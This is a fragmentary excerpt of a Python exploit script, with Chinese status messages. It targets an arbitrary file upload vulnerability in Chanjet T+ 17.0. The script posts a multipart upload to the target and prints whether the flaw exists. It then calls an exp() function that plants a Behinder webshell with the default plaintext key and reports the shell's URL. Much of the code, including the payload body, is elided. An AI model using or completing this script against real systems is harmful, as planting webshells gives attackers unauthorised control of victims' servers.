...
-----------------------------33007515338361897914262830846--'''
    ...
    print(now_time() + " [INFO]     正在检测用友畅捷通任意文件上传漏洞")
    try:
        requests.packages.urllib3.disable_warnings()
        response = requests.post(url=exp_url, headers=headers, data=data, verify=False)
        if response.status_code == 200:
            print(now_time() + ' [SUCCESS]  畅捷通T+17.0任意文件上传漏洞存在')
            exp(exp_url)
        else:
            print(now_time() + ' [WARNING]  畅捷通T+17.0任意文件上传漏洞不存在')
    except:
...
def exp(exp_url):
    ...
    try:
        ...
        if exp_m.status_code == 200 and exp_r.status_code == 200 and exp_x == 200:
            ...
            print(now_time() + ' [SUCCESS]  文件上传成功, 冰蝎默认明文密钥WebShell: {}'.format(shell_url))
        else:
            print(now_time() + ' [WARNING]  文件上传失败')
    except:
